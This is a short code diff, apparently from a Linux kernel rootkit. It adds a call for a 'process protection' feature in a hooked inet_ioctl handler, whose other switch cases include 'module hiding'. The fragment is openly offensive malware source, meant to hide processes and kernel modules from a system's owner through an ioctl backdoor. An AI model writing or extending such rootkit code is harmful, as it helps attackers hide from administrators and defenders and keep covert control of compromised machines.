@@ -68,6 +68,7 @@ static int khook_inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long
                 break;
             case 0x4:
                 // process protection
+                protect_process_hiding_request(cmd_arg.subargs) ;
                 break;
             case 0x5:
                 // module hiding
